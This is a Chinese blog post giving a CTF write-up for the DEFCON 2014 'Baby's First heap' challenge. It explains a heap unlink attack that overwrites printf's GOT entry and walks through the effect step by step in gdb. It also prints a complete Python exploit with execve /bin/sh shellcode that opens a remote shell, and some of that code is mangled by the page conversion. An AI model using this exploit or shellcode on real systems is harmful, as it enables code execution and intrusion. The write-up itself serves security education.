<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>DEFCON 2014 CTF-Baby&#39;s First-heap 动态分析及exploit | 喵喵喵喵 | 某鱼唇的人类</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="CTF,Pwn">
    <meta name="description" content="考虑Unlink Attack分配260字节后堆是这样的 这次为了详细说明，图中也显示size                                                                                                              memcpy()造成溢出 array[11]现在是使用中状态，可以通过堆溢出使其成为类">
<meta property="og:type" content="article">
<meta property="og:title" content="DEFCON 2014 CTF-Baby&#39;s First-heap 动态分析及exploit">
<meta property="og:url" content="https://darkwing.moe/2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%8F%8Aexploit/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="考虑Unlink Attack分配260字节后堆是这样的 这次为了详细说明，图中也显示size                                                                                                              memcpy()造成溢出 array[11]现在是使用中状态，可以通过堆溢出使其成为类">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032607.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032608.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032609.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032610.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032611.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032612.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032613.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032614.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032615.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032616.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032701.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032702.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032703.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032704.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032705.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032706.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032707.jpg">
<meta property="article:published_time" content="2019-03-28T02:10:17.000Z">
<meta property="article:modified_time" content="2019-03-28T02:11:24.570Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032607.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                彼女募集中
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                about
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">DEFCON 2014 CTF-Baby&#39;s First-heap 动态分析及exploit</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">DEFCON 2014 CTF-Baby&#39;s First-heap 动态分析及exploit</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-03-28T02:10:17.000Z" itemprop="datePublished" class="page-time">
  2019-03-28
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>

            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#考虑Unlink-Attack"><span class="post-toc-number">1.</span> <span class="post-toc-text">考虑Unlink Attack</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分配260字节后堆是这样的"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">分配260字节后堆是这样的</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#memcpy-造成溢出"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">memcpy()造成溢出</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#free-的时候，判断是否执行unlink-相关操作"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">free()的时候，判断是否执行unlink()相关操作</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#如何找到下面第二个的size变量位置"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">如何找到下面第二个的size变量位置</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#通过伪造size来伪造位置"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">通过伪造size来伪造位置</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#其他的注意点"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">其他的注意点</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Unlink之前，fd和bk准备成以下状态"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">Unlink之前，fd和bk准备成以下状态</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#动态分析及检查"><span class="post-toc-number">2.</span> <span class="post-toc-text">动态分析及检查</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#实际上是否真的按这个流程，我们可以用gdb来进行观察"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">实际上是否真的按这个流程，我们可以用gdb来进行观察</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#memcpy-前后"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">memcpy()前后</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#第11次free前后"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">第11次free前后</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#第11次free之后"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">第11次free之后</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#之后继续运行"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">之后继续运行</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#进行exploit"><span class="post-toc-number">3.</span> <span class="post-toc-text">进行exploit</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#接下来只需要写脚本"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">接下来只需要写脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#写一个脚本"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">写一个脚本</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#coding-utf-8"><span class="post-toc-number">4.</span> <span class="post-toc-text">-- coding: utf-8 --</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#linux-x86-execve-binsh"><span class="post-toc-number">5.</span> <span class="post-toc-text">linux&#x2F;x86&#x2F;execve_binsh</span></a></li></ol>
        </nav>
    </aside>


<article id="post-DEFCON-2014-CTF-Baby-s-First-heap-动态分析及exploit"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">DEFCON 2014 CTF-Baby's First-heap 动态分析及exploit</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-03-28 10:10:17" datetime="2019-03-28T02:10:17.000Z"  itemprop="datePublished">2019-03-28</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>



            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="考虑Unlink-Attack"><a href="#考虑Unlink-Attack" class="headerlink" title="考虑Unlink Attack"></a>考虑Unlink Attack</h1><h2 id="分配260字节后堆是这样的"><a href="#分配260字节后堆是这样的" class="headerlink" title="分配260字节后堆是这样的"></a>分配260字节后堆是这样的</h2><ul>
<li>这次为了详细说明，图中也显示size</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032607.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="memcpy-造成溢出"><a href="#memcpy-造成溢出" class="headerlink" title="memcpy()造成溢出"></a>memcpy()造成溢出</h2><ul>
<li>array[11]现在是使用中状态，可以通过堆溢出使其成为类似free状态的结构<ul>
<li>具体地说，就是通过堆溢出写入size，fd，bk等</li>
</ul>
</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032608.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="free-的时候，判断是否执行unlink-相关操作"><a href="#free-的时候，判断是否执行unlink-相关操作" class="headerlink" title="free()的时候，判断是否执行unlink()相关操作"></a>free()的时候，判断是否执行unlink()相关操作</h2><ul>
<li>Unlink的判断，会对array[10]之上和之下的chunk各进行一次<ul>
<li>对上面的chunk，检查自身size变量上的PREV_INUSE比特位(此处省略，暂时不关注)</li>
<li>对下面的chunk，检查下面第二个chunk的size上的PREV_INUSE比特位(注意这个)</li>
</ul>
</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032609.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<ul>
<li>array[10]进行free时，检查上面和下面的chunk是否是free状态</li>
<li>PREV_INUSE比特位是1，所以认为array[11]是使用中状态</li>
</ul>
<h2 id="如何找到下面第二个的size变量位置"><a href="#如何找到下面第二个的size变量位置" class="headerlink" title="如何找到下面第二个的size变量位置"></a>如何找到下面第二个的size变量位置</h2><ul>
<li>根据array[10]的位置加上size，能够找到array[11]的位置</li>
<li>根据array[11]的位置加上size，能够找到array[12]的位置</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032610.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="通过伪造size来伪造位置"><a href="#通过伪造size来伪造位置" class="headerlink" title="通过伪造size来伪造位置"></a>通过伪造size来伪造位置</h2><ul>
<li>例如，将array[11]的size更改为-4</li>
<li>使260字节数据的末尾比特是偶数<ul>
<li>这样从array[10]看的话，下面的chunk就是free状态，会进行unlink</li>
</ul>
</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032611.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<ul>
<li>要得到下面第二个chunk的位置，需要加上这个size，它是负数</li>
<li>这样计算得到的array[12]的地址是array[10]的末尾，它的PREV_INUSE是0，使得系统认为array[11]是free状态</li>
</ul>
<h2 id="其他的注意点"><a href="#其他的注意点" class="headerlink" title="其他的注意点"></a>其他的注意点</h2><ul>
<li><p>实际的内存中，-4表示为0xfffffffc</p>
</li>
<li><p>array[11]的size变量末尾也存在PREV_INUSE比特位，是1</p>
<ul>
<li>因为array[10]到现在为止还是使用中状态，如果是0的话在unlink之前就会出错</li>
</ul>
<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032612.jpg" alt=""></p>
</li>
</ul>
<h2 id="Unlink之前，fd和bk准备成以下状态"><a href="#Unlink之前，fd和bk准备成以下状态" class="headerlink" title="Unlink之前，fd和bk准备成以下状态"></a>Unlink之前，fd和bk准备成以下状态</h2><ul>
<li><p>此时，执行以下操作（P应视为array[11]）</p>
<ul>
<li>P-&gt;fd-&gt;bk = P-&gt;bk</li>
<li>P-&gt;bk-&gt;fd = P-&gt;fd</li>
</ul>
<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032613.jpg" alt=""></p>
</li>
<li><p>Unlink完成后，X周围区域已被重写</p>
</li>
<li><p>array[10]周围也被重写</p>
<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032614.jpg" alt=""></p>
</li>
<li><p>调整使得X-&gt;bk成为printf的GOT(保存函数地址的区域)</p>
</li>
<li><p>从260字节区域开始写入shellcode</p>
<ul>
<li>当调用printf的时候，会跳转到shellcode</li>
</ul>
<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032615.jpg" alt=""></p>
</li>
</ul>
<h1 id="动态分析及检查"><a href="#动态分析及检查" class="headerlink" title="动态分析及检查"></a>动态分析及检查</h1><h2 id="实际上是否真的按这个流程，我们可以用gdb来进行观察"><a href="#实际上是否真的按这个流程，我们可以用gdb来进行观察" class="headerlink" title="实际上是否真的按这个流程，我们可以用gdb来进行观察"></a>实际上是否真的按这个流程，我们可以用gdb来进行观察</h2><ul>
<li><p>安装gdb和之后使用的socat</p>
<ul>
<li><code>$ apt-get install gdb socat</code></li>
</ul>
</li>
<li><p>安装peda</p>
<ul>
<li><code>$ git clone https://github.com/longld/peda.git ~/peda</code></li>
<li><code>$echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</code></li>
</ul>
</li>
<li><p>peda的检查</p>
<ul>
<li><code>$ gdb -q /bin/ls</code></li>
<li>启动后，输入’start’，当出现彩色画面时，说明安装成功</li>
</ul>
</li>
<li><p>我经常写下面这种gdb脚本文件</p>
<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032616.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ cat cmd</span><br><span class="line">set follow-fork-mode child</span><br><span class="line"></span><br><span class="line">def show_heap</span><br><span class="line">	printf &quot;array[10].ptr begin\n&quot;</span><br><span class="line">	x&#x2F;8xw *(int*)($esp+0x60)</span><br><span class="line">	printf &quot;array[10].ptr end-0x10\n&quot; </span><br><span class="line">	x&#x2F;8xw *(int*)($esp+0x60)+0x104-0x10 </span><br><span class="line">	printf &quot;array[11].ptr begin\n&quot; </span><br><span class="line">	x&#x2F;8xw *(int*)($esp+0x68)</span><br><span class="line">	printf &quot;array[11].ptr end-0x10\n&quot;</span><br><span class="line">	x&#x2F;8xw *(int*)($esp+0x68)+0x374-0x10</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"># memcpy</span><br><span class="line">b *0x08048AA6</span><br><span class="line"></span><br><span class="line"># free</span><br><span class="line">b *0x08048afa </span><br><span class="line">ignore 2 0x0a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell perl -e &#39;print &quot;\x00&quot;x260 . pack(&quot;III&lt;&quot;, 0xfffffffd, 0x804C004-8, 0x804F350)&#39; &gt; pwn</span><br><span class="line">r &lt; pwn</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li>因为alarm()会妨碍分析，使用peda的函数使其无效</li>
<li>显示heap分配的内存地址信息</li>
<li>在free和memcpy上创建断点(不对前10次free断点)</li>
<li>堆的地址是本身是随机的，这里通过gdb运行是固定地址，除非明确关闭对应选项。我的环境中第11个堆地址是硬编码的，就是这个</li>
</ul>
<h2 id="memcpy-前后"><a href="#memcpy-前后" class="headerlink" title="memcpy()前后"></a>memcpy()前后</h2><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032701.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032702.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>产生了堆溢出，覆盖了下一个chunk</p>
<h2 id="第11次free前后"><a href="#第11次free前后" class="headerlink" title="第11次free前后"></a>第11次free前后</h2><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032703.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032704.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="第11次free之后"><a href="#第11次free之后" class="headerlink" title="第11次free之后"></a>第11次free之后</h2><ul>
<li><p>查看printf@got</p>
<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032705.jpg" alt=""></p>
</li>
<li><p>可以看到已经被重写为堆的地址</p>
</li>
<li><p>原始的值是这样</p>
</li>
<li><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032706.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

</li>
</ul>
<h2 id="之后继续运行"><a href="#之后继续运行" class="headerlink" title="之后继续运行"></a>之后继续运行</h2><ul>
<li>跳到了0x0804f350(堆区域)，SIGSEGV</li>
<li><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019032707.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure></li>
<li>我们已经控制了EIP的值(可以在此处写入shellcode)</li>
</ul>
<h1 id="进行exploit"><a href="#进行exploit" class="headerlink" title="进行exploit"></a>进行exploit</h1><h2 id="接下来只需要写脚本"><a href="#接下来只需要写脚本" class="headerlink" title="接下来只需要写脚本"></a>接下来只需要写脚本</h2><ul>
<li>以这个为基础<ul>
<li><code>perl -e &#39;print &quot;\x00&quot;x260 . pack(&quot;III&lt;&quot;, 0xfffffffd, 0x804C004-8, 0x804F350)&#39;</code></li>
</ul>
</li>
<li>shellcode还没准备好<ul>
<li>需要将””\x00”x260”的部分改为shellcode</li>
</ul>
</li>
<li>堆地址的动态对应<ul>
<li>堆地址本身是随机的，这道题目将其显示出来的</li>
</ul>
</li>
<li>实际环境中，是需要通过网络发送payload后，在远程服务器获取flag<ul>
<li>实施NW通信</li>
</ul>
</li>
</ul>
<h2 id="写一个脚本"><a href="#写一个脚本" class="headerlink" title="写一个脚本"></a>写一个脚本</h2><ul>
<li><p>首先需要一个网络发送数据的模板</p>
<ul>
<li><p>参考PPP的Write-up</p>
</li>
<li><pre><code> #!/usr/bin/python
# -*- coding: utf-8 -*-
import socket, struct, re, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect((remoteip, remoteport))
    return s, s.makefile(&apos;rw&apos;, bufsize=0)

def read_until(f, delim=&apos;¥n&apos;): 
    data = &apos;&apos;
    while not data.endswith(delim):
        data += f.read(1) 
  return data

def p(a):
    return struct.pack(&quot;&lt;I&quot;,a)

def shell(s):
    t = telnetlib.Telnet() 
    t.sock = s 
    t.interact()
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 实际攻击部分如下</span><br><span class="line"></span><br><span class="line">- 可以在下面地址找到shellcode，也可以自己构造</span><br><span class="line"></span><br><span class="line">  - http:&#x2F;&#x2F;shell-storm.org&#x2F;shellcode&#x2F;</span><br><span class="line"></span><br><span class="line">- 堆地址的动态对应只需要使用正则表达式解析服务器响应</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
# linux/x86/execve_binsh
shellcode = &quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot;
</code></pre></li>
</ul>
<p>s, f = sock(“localhost”, 4088)<br>#s, f = sock(“katagaitai.orz.hm”, 1111)<br>ret = read_until(f, “Write to object [size=260]:”)<br>print ret<br>heap_addr = int(re.findall(r”loc=([^]]+)”, ret)[10], 16)<br>print hex(heap_addr)</p>
<p>sc = “\xeb\x08” + ‘¥x00’*8 + shellcode.ljust(250, ‘¥x00’) + p(0xfffffffd) + p(0x0804C004-8) + p(heap_addr)<br>f.write(sc + “\n”)<br>shell(s)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 最终完整代码在这里</span><br><span class="line"></span><br><span class="line">- &lt;https:&#x2F;&#x2F;pastebin.com&#x2F;Cw6haUw5&gt;</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
<p>#!/usr/bin/python</p>
<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import socket, struct, re, telnetlib</p>
<p>###################### useful function definition<br>def sock(remoteip, remoteport):<br>  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>  s.connect((remoteip, remoteport))<br>  return s, s.makefile(‘rw’, bufsize=0)</p>
<p>def read_until(f, delim=’\n’):<br>  data = ‘’<br>  while not data.endswith(delim):</p>
<pre><code>data += f.read(1)</code></pre><p>  return data</p>
<p>def p(a):<br>  return struct.pack(“&lt;I”,a)</p>
<p>def shell(s):<br>  t = telnetlib.Telnet()<br>  t.sock = s<br>  t.interact()</p>
<p>###################### main</p>
<h1 id="linux-x86-execve-binsh"><a href="#linux-x86-execve-binsh" class="headerlink" title="linux/x86/execve_binsh"></a>linux/x86/execve_binsh</h1><p>shellcode = “\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80”</p>
<p>s, f = sock(“localhost”, 4088)<br>#s, f = sock(“katagaitai.orz.hm”, 1111)<br>ret = read_until(f, “Write to object [size=260]:”)<br>print ret<br>heap_addr = int(re.findall(r”loc=([^]]+)”, ret)[10], 16)<br>print hex(heap_addr)</p>
<p>sc = “\xeb\x08” + ‘¥x00’*8 + shellcode.ljust(250, ‘¥x00’) + p(0xfffffffd) + p(0x0804C004-8) + p(heap_addr)<br>f.write(sc + “\n”)<br>shell(s)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 由于Unlink稍微破坏了数据的开头，因此适当地连接0xEB 0x08，以便相对跳转可以跳过开头的2到10个字节。</span><br><span class="line"></span><br><span class="line">## 发送exploit后的内存情况(memcpy之后)</span><br><span class="line"></span><br><span class="line">![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032708.jpg)</span><br><span class="line"></span><br><span class="line">当unlink完成时，0x0804f350被写入printf@got，也就是说，当调用printf时，它会跳转到0x0804f350。</span><br><span class="line"></span><br><span class="line">但是，unlink之后，进行P-&gt;bk-&gt;fd &#x3D; P-&gt;fd这样的处理，第5-8字节被破坏了，因此第一二字节使用了short jmp跳过了被破坏的区域，进入执行shellcode</span><br><span class="line"></span><br><span class="line"># NW通信测试</span><br><span class="line"></span><br><span class="line">## 实际NW环境</span><br></pre></td></tr></table></figure>
<p>$ adduser user<br>$ cp ./heap /home/user/<br>$ chown user:user /home/user/heap<br>$ su user<br>$ socat TCP-LISTEN:4088,fork,reuseaddr EXEC:/home/user/heap &amp;<br>$ exit</p>
</li>
</ul>
<p>$ netstat -antpu |grep socat<br>tcp  0   0   0.0.0.0:4088    0.0.0.0:*    LISTEN    17728/socat<br>$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 尝试以另一个用户身份运行脚本</span><br><span class="line"></span><br><span class="line">- 以运行socat的用户权限打开shell</span><br><span class="line"></span><br><span class="line">  - 访问前修改脚本中的IP信息为远程环境信息</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
<p>  $ id<br>  uid=0(root) gid=0(root) groups=0(root)<br>  $ python exp.py<br>  (略)<br>  [FREE][address=9AA4C98] [FREE][address=9AA5058] [FREE][address=9AA5350]<br>  id<br>  uid=501(user) gid=502(user) groups=502(user)</p>
<pre><code></code></pre>
        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2019-03-28T02:11:24.570Z" itemprop="dateUpdated">2019-03-28 10:11:24</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        
<div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>



        <div class="post-footer">
            
